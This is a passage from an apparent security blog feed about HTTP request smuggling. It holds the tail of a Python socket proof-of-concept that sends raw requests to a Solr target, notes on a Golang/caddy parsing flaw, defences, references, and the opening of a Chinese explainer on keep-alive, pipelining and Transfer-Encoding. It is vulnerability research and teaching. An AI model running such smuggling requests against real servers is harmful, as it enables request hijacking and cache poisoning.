class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&apos;\n&apos;</span>, <span class="hljs-string">&apos;\r\n&apos;</span>)</span><br><span class="line"></span><br><span class="line">req2 = <span class="hljs-string">&quot;&quot;&quot;GET /solr/#/ HTTP/1.1</span></span><br><span class="line"><span class="hljs-string">Host: localhost:8983</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&apos;\n&apos;</span>, <span class="hljs-string">&apos;\r\n&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(netloc)</span>:</span></span><br><span class="line">    host, port = netloc.split(<span class="hljs-string">&apos;:&apos;</span>)</span><br><span class="line"></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, int(port)))</span><br><span class="line"></span><br><span class="line">    sock.sendall(req1)</span><br><span class="line">    sock.recv(<span class="hljs-number">4096</span>)</span><br><span class="line"></span><br><span class="line">    sock.sendall(req2)</span><br><span class="line">    <span class="hljs-comment"># print req2</span></span><br><span class="line">    data = sock.recv(<span class="hljs-number">4096</span>)</span><br><span class="line">    data = data.decode(errors = <span class="hljs-string">&apos;ignore&apos;</span>)</span><br><span class="line">    print(data)</span><br><span class="line">    data = sock.recv(<span class="hljs-number">4096</span>)</span><br><span class="line">    data = data.decode(errors = <span class="hljs-string">&apos;ignore&apos;</span>)</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line">    sock.shutdown(socket.SHUT_RDWR)</span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(<span class="hljs-string">&apos;ip:port&apos;</span>)</span><br></pre></td></tr></table></figure><h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><p>This is an interesting part. It was fuzzed at the beginning of October. Finally, I decided to test <a href="https://caddyserver.com/v1/" target="_blank" rel="noopener">caddy</a> , and took it to fuzz. Because I was lazy, I used the environment on the docker hub <a href="https: //hub.docker. com/r/abiosoft/caddy" target="_blank" rel="noopener">caddy</a>.</p><p>So, here we are.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129022617.png" alt></p><p>I was very happy at the time, thinking that getting a CVE was so simple. Because it is smiliar with Netty CVE , It could also produce a parsing difference. Then I and the mentor carefully explored the reason for this, followed the code, and found that it may be the cause of a native library in Golang.</p><p>I was happy at the time, and quickly searched how to raise an issue with Golang. But then I carefully worked on it for a while. I found that this issue had been mentioned on September 27 <a href="https://github.com/golang/go/issues/34540" target="_blank" rel="noopener">net / http: invalid headers are normalized, allowing request smuggling</a>, Golang also fixed the issue in version 1.13.1.</p><p>It&#x2019;s unhappy to miss a CVE. : (</p><p>But at present(11/27) the caddy environment on dockerhub still has this problem, use it with caution!</p><h2 id="Something-Else"><a href="#Something-Else" class="headerlink" title="Something Else"></a>Something Else</h2><p>There are related vulnerabilities disclosed on hackerone. Here are a few articles.</p><p><a href="https://medium.com/@cc1h2e1/write-up-of-two-http-requests-smuggling-ff211656fe7d" target="_blank" rel="noopener">Write up of two HTTP Requests Smuggling</a></p><p><a href="https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html" target="_blank" rel="noopener">HTTP Request Smuggling (CL.TE)</a></p><p><a href="https://hackerone.com/reports/694604" target="_blank" rel="noopener">HTTP Request Smuggling on vpn.lob.com</a></p><h1 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h1><blockquote><pre><code>We&apos;ve known the harm of HTTP request smuggling, and we will question: how to prevent it? There are three general defenses (not specific to a particular server).- Disable TCP connection reuse between the proxy server and the back end server.- Use the HTTP/2 protocol.- The front and back ends use the same server.Some of the above measures can not solve the problem fundamentally, and there are many shortcomings, such as disabling TCP connection reuse between the proxy server and the back-end server, which will increase the pressure on the back-end server. Using HTTP/2 can&apos;t be promoted under the current network conditions, even if the server supporting HTTP/2 protocol is compatible with HTTP/1.1. In essence, the reason for HTTP request smuggling is not the problem of protocol design, but the problem of different server implementations. I personally think that the best solution is to strictly implement the standards specified in RFC7230-7235, but this is the most difficult to achieve.</code></pre></blockquote><p>However, I have read a lot of attack articles which all did not mention why HTTP/2 can prevent HTTP Smuggling. The original author also mentioned in a sentence.</p><blockquote><p>Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.</p></blockquote><p>Then I went to check the differences between HTTP/2 and HTTP/1.1. In my opinion, I think that Request multiplexing over a single TCP connection is mainly added to HTTP/2, which means that using HTTP/2 can use a single TCP connection to request resources. This reduces the possibility of TCP connection reuse, even if you can smuggle, you can only hit yourself and the introduction of a new binary framing mechanism also limits this attack. And more imporantly, <code>Transfer-Encoding: chunk</code> is canceled in HTTP/2. :P</p><p>For details, please refer to <a href="[https://developers.google.com/web/fundamentals/performance/http2#%E6%AF%8F%E4%B8%AA%E6%9D%A5%E6%BA%90%E4%B8%80%E4%B8%AA%E8%BF%9E%E6%8E%A5](https://developers.google.com/web/fundamentals/performance/http2">the introduction of HTTP / 2</a>)</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191205225455.png" alt></p><h1 id="Bonus"><a href="#Bonus" class="headerlink" title="Bonus"></a>Bonus</h1><p>After this period of study and research, I have also organized some related experiments into a docker environment, which is convenient for everyone to reproduce learning&#xFF1A;<a href="https://github.com/ZeddYu/HTTP-Smuggling-Lab" target="_blank" rel="noopener">HTTP-Smuggling-Lab</a></p><p>Now the environment is not much. If you think the lab is useful, plz give me a star. I will continue to add more environments later to facilitate everyone to understand and learn this attack tech. <del>if I have enough time</del></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://tools.ietf.org/html/rfc7230" target="_blank" rel="noopener">RFC7230</a></p><p><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">HTTP Desync Attacks: Request Smuggling Reborn</a></p><p><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling</a></p><p><a href="https://regilero.github.io/tag/Smuggling/" target="_blank" rel="noopener">regilero&#x2019;s blog</a></p><p><a href="https://paper.seebug.org/1049/" target="_blank" rel="noopener">Protocol Layer Attack - HTTP Request Smuggling</a></p><p><a href="https://github.com/netty/netty/issues/9571" target="_blank" rel="noopener">http request smuggling, cause by obfuscating TE header</a></p><p><a href="https://hackerone.com/reports/648434" target="_blank" rel="noopener">Multiple HTTP Smuggling reports</a></p><p><a href="https://medium.com/@factoryhr/http-2-the-difference-between-http-1-1-benefits-and-how-to-use-it-38094fa0e95b" target="_blank" rel="noopener">HTTP/2: the difference between HTTP/1.1, benefits and how to use it</a></p>]]></content>
        <author>
            <name><![CDATA[Zedd’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/</id>
        <title><![CDATA[一篇文章带你读懂 HTTP Smuggling 攻击]]></title>
        <updated>2020-04-11T11:55:30+08:00</updated>
        <link href="https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/"><![CDATA[<p>&#x4ECA;&#x5E74;&#x7684; Defcon 27 &#x4E0E; Black Hat &#x4E0A;&#x90FD;&#x6709;&#x63D0;&#x5230; HTTP DESYNC ATTACKS &#xFF0C;&#x524D;&#x51E0;&#x4E2A;&#x6708;&#x5C31;&#x60F3;&#x62BD;&#x65F6;&#x95F4;&#x6765;&#x7814;&#x7A76;&#x7814;&#x7A76;&#x4E86;&#xFF0C;&#x5948;&#x4F55;&#x4E00;&#x76F4;&#x6CA1;&#x4EC0;&#x4E48;&#x65F6;&#x95F4;&#xFF0C;&#x6700;&#x8FD1;&#x62BD;&#x65F6;&#x95F4;&#x4E13;&#x95E8;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#x3002;</p><blockquote class="colorquote success"><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x5148;&#x77E5;&#x793E;&#x533A;&#xFF1A;<a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">https://xz.aliyun.com/t/6878</a></p></blockquote><a id="more"></a><p>&#x5728;&#x524D;&#x4E9B;&#x5929;&#x7814;&#x7A76;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6070;&#x5DE7; <strong>mengchen@&#x77E5;&#x9053;&#x521B;&#x5B87;404&#x5B9E;&#x9A8C;&#x5BA4;</strong> &#x4E5F;&#x53D1;&#x8868;&#x4E86;<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">&#x534F;&#x8BAE;&#x5C42;&#x7684;&#x653B;&#x51FB;&#x2014;&#x2014;HTTP&#x8BF7;&#x6C42;&#x8D70;&#x79C1;</a>&#x6587;&#x7AE0;&#xFF0C;&#x4E5F;&#x5E26;&#x7ED9;&#x4E86;&#x81EA;&#x5DF1;&#x66F4;&#x591A;&#x7684;&#x542F;&#x793A;&#xFF0C;&#x5E08;&#x5085;&#x7684;&#x6587;&#x7AE0;&#x5199;&#x7684;&#x975E;&#x5E38;&#x7684;&#x4E0D;&#x9519;&#xFF0C;&#x5899;&#x88C2;&#x5EFA;&#x8BAE;&#x9605;&#x8BFB;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x7ED3;&#x5408;&#x5E08;&#x5085;&#x7684;&#x6587;&#x7AE0;&#x8DDF;&#x81EA;&#x5DF1;&#x7684;&#x4E00;&#x4E9B;&#x7406;&#x89E3;&#x8FDB;&#x884C;&#x4E00;&#x4E9B;&#x6574;&#x7406;&#xFF0C;&#x672C;&#x6587;&#x4EA6;&#x53EF;&#x7406;&#x89E3;&#x4E3A;&#x90A3;&#x7BC7;&#x6587;&#x7AE0;&#x7684;&#x8865;&#x5145;&#x4E0E;&#x66F4;&#x8BE6;&#x7EC6;&#x7684;&#x63CF;&#x8FF0;&#x3002;</p><p>&#x6574;&#x7BC7;&#x6587;&#x7AE0;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x65F6;&#x95F4;&#x95EE;&#x9898;&#xFF0C;&#x524D;&#x524D;&#x540E;&#x540E;&#x62D6;&#x4E86;&#x4E24;&#x4E2A;&#x6708;&#x5DE6;&#x53F3;&#xFF0C;&#x4E2D;&#x95F4;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x53EF;&#x80FD;&#x6BD4;&#x8F83;&#x4E45;&#xFF0C;&#x6240;&#x4EE5;&#x6587;&#x7AE0;&#x4F1A;&#x6709;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x758F;&#x6F0F;&#xFF0C;&#x8FD8;&#x8BF7;&#x5E08;&#x5085;&#x4EEC;&#x770B;&#x540E;&#x76F4;&#x63A5;&#x6307;&#x51FA;&#x65A7;&#x6B63;&#x3002;&#x5199;&#x4F5C;&#x4E0D;&#x6613;&#xFF0C;&#x8FD8;&#x8BF7;&#x5E08;&#x5085;&#x4EEC;&#x591A;&#x591A;&#x62C5;&#x5F85;&#x3002;&#x6700;&#x8FD1;&#x4E5F;&#x4E00;&#x76F4;&#x5728;&#x5173;&#x6CE8;&#x8FD9;&#x65B9;&#x9762;&#x7684;&#x5B89;&#x5168;&#x95EE;&#x9898;&#xFF0C;&#x6B22;&#x8FCE;&#x4E00;&#x8D77;&#x5B66;&#x4E60;&#x8BA8;&#x8BBA;: ) &#x8054;&#x7CFB;&#x65B9;&#x5F0F;&#xFF1A;emVkZHl1Lmx1QGdtYWlsLmNvbQ== </p><p>&#x540E;&#x7EED;&#x5982;&#x679C;&#x6709;&#x65B0;&#x7684;&#x603B;&#x7ED3;&#x53D1;&#x73B0;&#x4E5F;&#x4F1A;&#x53D1;&#x81EA;&#x5DF1;&#x7684;<a href="https://blog.zeddyu.info">&#x5783;&#x573E;&#x535A;&#x5BA2;</a>&#x6216;&#x8005;&#x5148;&#x77E5;&#xFF08;&#x5C31;&#x770B;&#x56FD;&#x9645;&#x9ED1;&#x5BA2;&#x9648;&#x5E08;&#x5085;&#x7ED9;&#x4E0D;&#x7ED9;&#x8FC7;&#x4E86;&#xFF09;</p><h1 id="TL-NR"><a href="#TL-NR" class="headerlink" title="TL;NR"></a>TL;NR</h1><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191205171217.jpeg" alt></p><p>Pic from <a href="https://twitter.com/SpiderSec/status/1200413390339887104?s=19" target="_blank" rel="noopener">https://twitter.com/SpiderSec/status/1200413390339887104?s=19</a></p><h1 id="TimeLine"><a href="#TimeLine" class="headerlink" title="TimeLine"></a>TimeLine</h1><p>&#x5728;&#x6211;&#x4EEC;&#x63D0; HTTP Smuggling &#x4E4B;&#x524D;&#x6211;&#x4EEC;&#x9996;&#x5148;&#x6765;&#x770B;&#x770B;&#x5176;&#x4E2D;&#x7684;&#x6F14;&#x53D8;&#x8FC7;&#x7A0B;&#xFF1A;</p><p>@Amit Klein &#x5728; 2004 &#x5E74;&#x63D0;&#x51FA; <a href="https://dl.packetstormsecurity.net/papers/general/whitepaper_httpresponse.pdf" target="_blank" rel="noopener">HTTP Response Splitting</a> &#x6280;&#x672F;&#xFF0C;&#x662F; HTTP Smuggling &#x653B;&#x51FB;&#x7684;&#x96CF;&#x5F62;&#x3002;</p><p>&#x5173;&#x4E8E; HTTP Smuggling &#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x5728; 2005 &#x5E74;&#x5DF2;&#x7531; @Watchfire &#x9996;&#x6B21;&#x63D0;&#x51FA; <a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank" rel="noopener">HTTP Request Smuggling</a> &#x3002;</p><p>HTTP Parameter Pollution (HPP)&#xFF0C;&#x4E5F;&#x5C31;&#x662F; HTTP &#x53C2;&#x6570;&#x6C61;&#x67D3;&#xFF0C;&#x8FD9;&#x5176;&#x5B9E;&#x4E5F;&#x7B97;&#x662F;&#x4E00;&#x79CD;&#x201D;&#x7279;&#x6B8A;&#x201D;&#x7684; HTTP Smuggling &#x653B;&#x51FB;&#xFF0C;&#x5728; 2009 &#x5E74;&#x7531; @Stefano di Paola &amp; @Luca Carettoni &#x5728; OWASP Poland conference &#x4E0A;&#x9996;&#x6B21;&#x63D0;&#x51FA;&#xFF0C;&#x4E00;&#x7ECF;&#x63D0;&#x51FA;&#x5C31;&#x5F15;&#x8D77;&#x4E86;&#x6BD4;&#x8F83;&#x5927;&#x7684;&#x8F70;&#x52A8;&#xFF0C;&#x88AB;&#x5E7F;&#x6CDB;&#x8FD0;&#x7528;&#x5728;&#x7ED5;&#x8FC7; WAF &#x5F53;&#x4E2D;&#x3002;</p><p>2016 &#x5E74; Defcon 24 &#xFF0C;@regilero &#x63D0;&#x51FA;&#x4E86; <a href="[https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf](https://media.defcon.org/DEF CON 24/DEF CON 24 presentations/DEF CON 24 - Regilero-Hiding-Wookiees-In-Http.pdf">Hiding Wookiees In Http</a>)&#xFF0C;&#x8FDB;&#x4E00;&#x6B65;&#x63ED;&#x793A;&#x4E86; HTTP Smuggling &#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x3002;</p><p>2019 &#x5E74; Defcon 27&#xFF0C; @James Kettle &#x63D0;&#x51FA;&#x4E86; <a href="[https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-albinowax-HTTP-Desync-Attacks.pdf](https://media.defcon.org/DEF CON 27/DEF CON 27 presentations/DEFCON-27-albinowax-HTTP-Desync-Attacks.pdf">HTTP Desync Attacks: Smashing into the Cell Next Door</a>)&#xFF0C;&#x8BB2;&#x89E3;&#x4E86;&#x5982;&#x4F55;&#x7528; HTTP Smuggling &#x6280;&#x672F;&#x6316;&#x6398;&#x5230;&#x4E86; Paypal &#x7684;&#x6F0F;&#x6D1E;&#x3002;</p><h1 id="Causes"><a href="#Causes" class="headerlink" title="Causes"></a>Causes</h1><p>&#x7136;&#x800C;@James Kettle &#x7684; PPT &#x91CC;&#x9762;&#x4E5F;&#x5E76;&#x6CA1;&#x6709;&#x975E;&#x5E38;&#x8BE6;&#x7EC6;&#x7EC6;&#x81F4;&#x5730;&#x8BB2;&#x8FF0;&#x8FD9;&#x4E2A;&#x653B;&#x51FB;&#x662F;&#x4EC0;&#x4E48;&#xFF0C;&#x4EE5;&#x53CA;&#x600E;&#x4E48;&#x5F62;&#x6210;&#x7684;&#xFF0C;&#x5F53;&#x521D;&#x81EA;&#x5DF1;&#x770B;&#x5B8C;&#x8FD8;&#x662F;&#x62B1;&#x7740;&#x975E;&#x5E38;&#x5927;&#x7684;&#x7591;&#x60D1;&#x7684;&#xFF0C;&#x540E;&#x6765;&#x5B66;&#x4E60;&#x4E86; @regilero &#x535A;&#x5BA2;&#x4E2D;&#x5173;&#x4E8E; <a href="https://regilero.github.io/tag/Smuggling/" target="_blank" rel="noopener">HTTP Smuggling &#x7684;&#x6587;&#x7AE0;</a>&#xFF0C;&#x6211;&#x624D;&#x6709;&#x4E86;&#x6E05;&#x6670;&#x7684;&#x8BA4;&#x8BC6;&#x3002;</p><h2 id="HTTP-Connection-Mod"><a href="#HTTP-Connection-Mod" class="headerlink" title="HTTP Connection Mod"></a>HTTP Connection Mod</h2><blockquote><p>&#x200B;    &#x5728;<code>HTTP1.0</code>&#x4E4B;&#x524D;&#x7684;&#x534F;&#x8BAE;&#x8BBE;&#x8BA1;&#x4E2D;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x6BCF;&#x8FDB;&#x884C;&#x4E00;&#x6B21;HTTP&#x8BF7;&#x6C42;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x540C;&#x670D;&#x52A1;&#x5668;&#x5EFA;&#x7ACB;&#x4E00;&#x4E2A;TCP&#x94FE;&#x63A5;&#x3002;&#x800C;&#x73B0;&#x4EE3;&#x7684;Web&#x7F51;&#x7AD9;&#x9875;&#x9762;&#x662F;&#x7531;&#x591A;&#x79CD;&#x8D44;&#x6E90;&#x7EC4;&#x6210;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x8981;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;&#x7F51;&#x9875;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x4E0D;&#x4EC5;&#x8981;&#x8BF7;&#x6C42;HTML&#x6587;&#x6863;&#xFF0C;&#x8FD8;&#x6709;JS&#x3001;CSS&#x3001;&#x56FE;&#x7247;&#x7B49;&#x5404;&#x79CD;&#x5404;&#x6837;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x8FD9;&#x6837;&#x5982;&#x679C;&#x6309;&#x7167;&#x4E4B;&#x524D;&#x7684;&#x534F;&#x8BAE;&#x8BBE;&#x8BA1;&#xFF0C;&#x5C31;&#x4F1A;&#x5BFC;&#x81F4;HTTP&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D1F;&#x8F7D;&#x5F00;&#x9500;&#x589E;&#x5927;&#x3002;&#x4E8E;&#x662F;&#x5728;<code>HTTP1.1</code>&#x4E2D;&#xFF0C;&#x589E;&#x52A0;&#x4E86;<code>Keep-Alive</code>&#x548C;<code>Pipeline</code>&#x8FD9;&#x4E24;&#x4E2A;&#x7279;&#x6027;&#x3002;</p></blockquote><h3 id="Keep-Alive"><a href="#Keep-Alive" class="headerlink" title="Keep-Alive"></a>Keep-Alive</h3><p>&#x6839;&#x636E; <a href="https://tools.ietf.org/html/rfc7230#section-6" target="_blank" rel="noopener">RFC7230</a> &#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;</p><blockquote><p>&#x200B;    HTTP/1.1 defaults to the use of &#x201C;persistent connections&#x201D;, allowing multiple requests and responses to be carried over a single connection.  The &#x201C;close&#x201D; connection option is used to signal that a connection will not persist after the current request/response.  HTTP implementations SHOULD support persistent connections.</p></blockquote><p>&#x5728; HTTP/1.1 &#x4E2D;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;<code>Keep-Alive</code>&#xFF0C;&#x4ECE;&#x800C;&#x5141;&#x8BB8;&#x5728;&#x5355;&#x4E2A;&#x8FDE;&#x63A5;&#x4E0A;&#x627F;&#x8F7D;&#x591A;&#x4E2A;&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;&#x3002;</p><blockquote><p>&#x6240;&#x8C13;<code>Keep-Alive</code>&#xFF0C;&#x5C31;&#x662F;&#x5728;HTTP&#x8BF7;&#x6C42;&#x4E2D;&#x589E;&#x52A0;&#x4E00;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x8BF7;&#x6C42;&#x5934;<code>Connection: Keep-Alive</code>&#xFF0C;&#x544A;&#x8BC9;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x63A5;&#x6536;&#x5B8C;&#x8FD9;&#x6B21;HTTP&#x8BF7;&#x6C42;&#x540E;&#xFF0C;&#x4E0D;&#x8981;&#x5173;&#x95ED;TCP&#x94FE;&#x63A5;&#xFF0C;&#x540E;&#x9762;&#x5BF9;&#x76F8;&#x540C;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5668;&#x7684;HTTP&#x8BF7;&#x6C42;&#xFF0C;&#x91CD;&#x7528;&#x8FD9;&#x4E00;&#x4E2A;TCP&#x94FE;&#x63A5;&#xFF0C;&#x8FD9;&#x6837;&#x53EA;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x4E00;&#x6B21;TCP&#x63E1;&#x624B;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x53EF;&#x4EE5;&#x51CF;&#x5C11;&#x670D;&#x52A1;&#x5668;&#x7684;&#x5F00;&#x9500;&#xFF0C;&#x8282;&#x7EA6;&#x8D44;&#x6E90;&#xFF0C;&#x8FD8;&#x80FD;&#x52A0;&#x5FEB;&#x8BBF;&#x95EE;&#x901F;&#x5EA6;&#x3002;&#x5F53;&#x7136;&#xFF0C;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x5728;<code>HTTP1.1</code>&#x4E2D;&#x662F;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;&#x7684;&#x3002;</p></blockquote><p>&#x5F53;&#x7136;&#xFF0C;&#x6709;&#x4E9B;&#x8BF7;&#x6C42;&#x5E26;&#x7740;<code>Connection: close</code>&#x7684;&#x8BDD;&#xFF0C;&#x901A;&#x4FE1;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x4E2D;&#x65AD; TCP &#x8FDE;&#x63A5;&#x3002;</p><h3 id="Pipline"><a href="#Pipline" class="headerlink" title="Pipline"></a>Pipline</h3><blockquote><p>&#x6709;&#x4E86;<code>Keep-Alive</code>&#x4E4B;&#x540E;&#xFF0C;&#x540E;&#x7EED;&#x5C31;&#x6709;&#x4E86;<code>Pipeline</code>&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x5462;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x53EF;&#x4EE5;&#x50CF;&#x6D41;&#x6C34;&#x7EBF;&#x4E00;&#x6837;&#x53D1;&#x9001;&#x81EA;&#x5DF1;&#x7684;HTTP&#x8BF7;&#x6C42;&#xFF0C;&#x800C;&#x4E0D;&#x9700;&#x8981;&#x7B49;&#x5F85;&#x670D;&#x52A1;&#x5668;&#x7684;&#x54CD;&#x5E94;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x90A3;&#x8FB9;&#x63A5;&#x6536;&#x5230;&#x8BF7;&#x6C42;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x9075;&#x5FAA;&#x5148;&#x5165;&#x5148;&#x51FA;&#x673A;&#x5236;&#xFF0C;&#x5C06;&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;&#x4E25;&#x683C;&#x5BF9;&#x5E94;&#x8D77;&#x6765;&#xFF0C;&#x518D;&#x5C06;&#x54CD;&#x5E94;&#x53D1;&#x9001;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</p><p>&#x73B0;&#x5982;&#x4ECA;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x9ED8;&#x8BA4;&#x662F;&#x4E0D;&#x542F;&#x7528;<code>Pipeline</code>&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x4E00;&#x822C;&#x7684;&#x670D;&#x52A1;&#x5668;&#x90FD;&#x63D0;&#x4F9B;&#x4E86;&#x5BF9;<code>Pipleline</code>&#x7684;&#x652F;&#x6301;&#x3002;</p></blockquote><p>&#x5728; HTTP/1.1 &#x4E2D;&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x5F15;&#x5165;&#x5C31;&#x662F; pipeline &#x6280;&#x672F;&#x4E86;&#xFF0C;&#x4EE5;&#x4E0B;&#x662F;&#x4F7F;&#x7528;&#x4EE5;&#x53CA;&#x4E0D;&#x4F7F;&#x7528; piepeline &#x6280;&#x672F;&#x7684;&#x5BF9;&#x6BD4;&#x56FE;&#xFF1A;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191017234109.png" alt></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6E05;&#x6670;&#x5730;&#x770B;&#x5230;&#xFF0C;&#x4F7F;&#x7528;&#x4E86; pipeline &#x4E4B;&#x540E;&#x4E0D;&#x5FC5;&#x518D;&#x9700;&#x8981;&#x7B49;&#x5F85;&#x524D;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x5B8C;&#x6210;&#x5176;&#x54CD;&#x5E94;&#x518D;&#x5904;&#x7406;&#x7B2C;&#x4E8C;&#x4E2A;&#x8BF7;&#x6C42;&#x4E86;&#xFF0C;&#x8FD9;&#x4E2A;&#x6709;&#x70B9;&#x5F02;&#x6B65;&#x5904;&#x7406;&#x7684;&#x610F;&#x601D;&#x5728;&#x91CC;&#x9762;&#x3002;</p><h2 id="Message-Body"><a href="#Message-Body" class="headerlink" title="Message Body"></a>Message Body</h2><p><a href="https://tools.ietf.org/html/rfc7230#section-3.3" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7230#section-3.3</a></p><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><blockquote><p>&#x200B;    Transfer-Encoding is analogous to the Content-Transfer-Encoding field of MIME, which was designed to enable safe transport of binary data over a 7-bit transport service ([RFC2045], Section 6).  However, safe transport has a different focus for an 8bit-clean transfer protocol. In HTTP&#x2019;s case, Transfer-Encoding is primarily intended to accurately delimit a dynamically generated payload and to distinguish payload encodings that are only applied for transport efficiency or security from those that are characteristics of the selected resource.</p></blockquote><p>Transfer-Encoding &#x662F;&#x4E00;&#x79CD;&#x88AB;&#x8BBE;&#x8BA1;&#x7528;&#x6765;&#x652F;&#x6301; 7-bit &#x4F20;&#x8F93;&#x670D;&#x52A1;&#x5B89;&#x5168;&#x4F20;&#x8F93;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;&#x7684;&#x5B57;&#x6BB5;&#xFF0C;&#x6709;&#x70B9;&#x7C7B;&#x4F3C;&#x4E8E; MIME (Multipurpose Internet Mail Extensions) Header &#x4E2D;&#x7684; Content-Transfer-Encoding &#x3002;&#x5728;HTTP&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;Transfer-Encoding &#x7684;&#x4E3B;&#x8981;&#x7528;&#x6765;&#x4EE5;&#x6307;&#x5B9A;&#x7684;&#x7F16;&#x7801;&#x5F62;&#x5F0F;&#x7F16;&#x7801; payload body &#x5B89;&#x5168;&#x5730;&#x4F20;&#x8F93;&#x7ED9;&#x7528;&#x6237;&#x3002;&#x5728; HTTP/1.1 &#x4E2D;&#x5F15;&#x5165;&#xFF0C;&#x5728; HTTP/2 &#x4E2D;&#x53D6;&#x6D88;&#x3002;</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding" target="_blank" rel="noopener">MDN</a> &#x5217;&#x4E3E;&#x4E86;&#x51E0;&#x79CD;&#x5C5E;&#x6027;&#xFF1A;</p><figure class="highlight coq hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunked | <span class="hljs-type">compress</span> | <span class="hljs-type">deflate</span> | <span class="hljs-type">gzip</span> | <span class="hljs-type">identity</span></span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x4E3B;&#x8981;&#x5173;&#x6CE8; chunked &#x8FD9;&#x4E00;&#x79CD;&#x4F20;&#x8F93;&#x7F16;&#x7801;&#x65B9;&#x5F0F;&#xFF0C;&#x5B83;&#x5728;&#x7F51;&#x7EDC;&#x653B;&#x51FB;&#x4E2D;&#x4E5F;&#x4E0D;&#x662F;&#x7B2C;&#x4E00;&#x6B21;&#x63D0;&#x53CA;&#x4E86;&#xFF0C;&#x4E4B;&#x524D;&#x5C31;&#x6709;&#x5E08;&#x5085;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x5B57;&#x6BB5;&#x53BB;&#x7ED5;&#x8FC7;&#x4E00;&#x4E9B; WAF&#xFF0C;&#x53EF;&#x4EE5;&#x53C2;&#x8003; <a href="https://www.freebuf.com/articles/web/194351.html" target="_blank" 